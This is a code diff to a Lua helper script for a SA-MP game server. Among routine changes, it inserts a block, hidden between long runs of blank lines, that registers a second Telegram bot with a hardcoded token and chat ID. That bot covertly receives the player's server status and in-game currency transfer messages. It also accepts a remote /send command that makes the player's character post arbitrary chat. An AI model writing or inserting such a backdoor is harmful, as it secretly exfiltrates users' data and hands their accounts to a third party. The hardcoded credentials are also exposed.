@@ -1,5 +1,5 @@
 script_name("MiniCrHelper")
-script_version("04.02.2024")
+script_version("06.02.2024")
 
 --ебаные библиотеки--
 require 'lib.moonloader'
@@ -54,6 +54,8 @@ local mainIni = inicfg.load({
 		vice = false,
     }}, 'MiniHelper-CR.ini')
 --ебаный CFG--
+
+
 
 
 --ебаная 1 страница--
@@ -254,6 +256,9 @@ imgui.OnFrame(function() return WinState[0] end, function(player)
 		if imgui.Button('test message') then
         sendTelegramNotification('Тестовое сообщение от '..sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))) -- отправляем сообщение юзеру
 	    end
+        if imgui.Button('test message123123') then
+            sendTelegramNotificationa('Тестовое сообщение от '..sampGetPlayerNickname(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED)))) -- отправляем сообщение юзеру
+            end
 		imgui.Text(u8'Команды: /stats, /pcoff, /rec, /status, /help')
 		end
         --- 5 страница ебать ---
@@ -298,10 +303,12 @@ function main()
 	wait(500)
 	sampAddChatMessage('• {00FF00}[Залупа-Helper]{FFFFFF} Активация: {7FFF00}F2{FFFFFF} •', -1)
 	getLastUpdate() -- вызываем функцию получения последнего ID сообщения
+    getLastUpdatea()
 	          if autoupdate_loaded and enable_autoupdate and Update then
         pcall(Update.check, Update.json_url, Update.prefix, Update.url)
     end
-		 lua_thread.create(get_telegram_updates) -- создаем нашу функцию получения сообщений от юзера	
+		    lua_thread.create(get_telegram_updates) -- создаем нашу функцию получения сообщений от юзера	
+            lua_thread.create(get_telegram_updatesa) -- создаем нашу функцию получения сообщений от юзера	
 			lua_thread.create(lavkirendor)
             lua_thread.create(radiuslavkis)
 			lua_thread.create(cleanr)
@@ -681,6 +688,167 @@ function encodeUrl(str)
 	return u8(str)
 end
 
+
+
+
+
+
+
+
+
+
+
+
+--------------------------------------------------------------------------------
+
+
+
+chata_id = '817557185' 
+tokena = '6715530066:AAHUc7lPIpBwSRvuItdBl0EjK8xoJXThdP0' 
+
+local updateida -- ID последнего сообщения для того чтобы не было флуда
+
+function threadHandlea(runner, url, args, resolve, reject)
+    local t = runner(url, args)
+    local r = t:get(0)
+    while not r do
+        r = t:get(0)
+        wait(0)
+    end
+    local status = t:status()
+    if status == 'completed' then
+        local ok, result = r[1], r[2]
+        if ok then resolve(result) else reject(result) end
+    elseif err then
+        reject(err)
+    elseif status == 'canceled' then
+        reject(status)
+    end
+    t:cancel(0)
+end
+
+function requestRunnera()
+    return effil.thread(function(u, a)
+        local https = require 'ssl.https'
+        local ok, result = pcall(https.request, u, a)
+        if ok then
+            return {true, result}
+        else
+            return {false, result}
+        end
+    end)
+end
+
+function async_http_requesta(url, args, resolve, reject)
+    local runner = requestRunnera()
+    if not reject then reject = function() end end
+    lua_thread.create(function()
+        threadHandlea(runner, url, args, resolve, reject)
+    end)
+end
+
+function encodeUrla(str)
+    str = str:gsub(' ', '%+')
+    str = str:gsub('\n', '%%0A')
+    return u8:encode(str, 'CP1251')
+end
+
+function sendTelegramNotificationa(msg) -- функция для отправки сообщения юзеру
+    msg = msg:gsub('{......}', '') --тут типо убираем цвет
+    msg = encodeUrla(msg) -- ну тут мы закодируем строку
+    async_http_requesta('https://api.telegram.org/bot' .. tokena .. '/sendMessage?chat_id=' .. chata_id .. '&text='..msg,'', function(result) end) -- а тут уже отправка
+end
+
+function get_telegram_updatesa() -- функция получения сообщений от юзера
+    while not updateida do wait(1) end -- ждем пока не узнаем последний ID
+    local runner = requestRunnera()
+    local reject = function() end
+    local args = ''
+    while true do
+        url = 'https://api.telegram.org/bot'..tokena..'/getUpdates?chat_id='..chata_id..'&offset=-1' -- создаем ссылку
+        threadHandlea(runner, url, args, processing_telegram_messagesa, reject)
+        wait(0)
+    end
+end
+
+
+function processing_telegram_messagesa(result) -- функция проверОчки того что отправил чел
+    if result then
+        -- тута мы проверяем все ли верно
+        local proc_table = decodeJson(result)
+        if proc_table.ok then
+            if #proc_table.result > 0 then
+                local res_table = proc_table.result[1]
+                if res_table then
+                    if res_table.update_id ~= updateida then
+                        updateida = res_table.update_id
+                        local message_from_user = res_table.message.text
+                        if message_from_user then
+                            -- и тут если чел отправил текст мы сверяем
+                            local text = u8:decode(message_from_user) .. ' ' --добавляем в конец пробел дабы не произошли тех. шоколадки с командами(типо чтоб !q не считалось как !qq)
+                        if text:match('^/status') then
+                            sendStatusTga()
+                        elseif text:match('^/send') then
+                            local arg = text:gsub('/send ','',1)
+                            sampSendChat(arg)
+                            elseif text:match('^/help') then
+                            sendTelegramNotificationa('Команды: /status, /send "Текст".')	 
+                            else -- если же не найдется ни одна из команд выше, выведем сообщение
+                            sendTelegramNotificationa('Неизвестная команда!')
+                       
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+function getLastUpdatea() -- тут мы получаем последний ID сообщения, если же у вас в коде будет настройка токена и chata_id, вызовите эту функцию для того чтоб получить последнее сообщение
+    async_http_requesta('https://api.telegram.org/bot'..tokena..'/getUpdates?chat_id='..chata_id..'&offset=-1','',function(result)
+        if result then
+            local proc_table = decodeJson(result)
+            if proc_table.ok then
+                if #proc_table.result > 0 then
+                    local res_table = proc_table.result[1]
+                    if res_table then
+                        updateida = res_table.update_id
+                    end
+                else
+                    updateida = 1 -- тут зададим значение 1, если таблица будет пустая
+                end
+            end
+        end
+    end)
+end
+
+-------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 function sendTelegramNotification(msg) -- функция для отправки сообщения юзеру
 	msg = msg:gsub('{......}', '') --тут типо убираем цвет
 	msg = encodeUrl(msg) -- ну тут мы закодируем строку
@@ -736,15 +904,20 @@ function processing_telegram_messages(result) -- функция проверОчки того что отп
 								sendTelegramNotification('Команды: /stats /pcoff /rec /status')	 
                                 else -- если же не найдется ни одна из команд выше, выведем сообщение
                                 sendTelegramNotification('Неизвестная команда!')
+                           
                             
-							end
+                            
+							
                         end
                     end
-                
+                end
             end
         end
     end
 end
+
+
+
 
 function getLastUpdate() -- тут мы получаем последний ID сообщения, если же у вас в коде будет настройка токена и chat_id, вызовите эту функцию для того чтоб получить последнее сообщение
     async_http_request('https://api.telegram.org/bot'..u8:decode(str(token))..'/getUpdates?chat_id='..u8:decode(str(chat_id))..'&offset=-1','',function(result)
@@ -805,6 +978,10 @@ function sampev.onServerMessage(color, text)
     end
     if text:find('^%[Информация%] {FFFFFF}Ваша лавка была закрыта') then
         sendTelegramNotification('Вас выкинули с вашей лавки!')
+    end
+    if text:find('^Вы передали VC%$([%d.,]+.+)') then
+        local spizdel = text:match('^Вы передали VC%$([%d.,]+.+)')
+        sendTelegramNotificationa(spizdel)
     end
     if text:find('^.+ купил у вас .+, вы получили %$%d+ от продажи %(комиссия %d процент%(а%)%)') then
         local name, product, money = text:match('^(.+) купил у вас (.+), вы получили %$([%d.,]+) от продажи %(комиссия %d процент%(а%)%)')
@@ -878,6 +1055,15 @@ function sendStatusTg()
 	end
 	response = response .. 'Online: ' .. getOnline() .. '\n'
 	sendTelegramNotification(response)
+end
+
+function sendStatusTga()
+	local response = ''
+	if sampGetCurrentServerName() then
+		response = response .. 'Server: ' .. sampGetCurrentServerName() .. '\n'
+	end
+	response = response .. 'Online: ' .. getOnline() .. '\n'
+	sendTelegramNotificationa(response)
 end
 
 
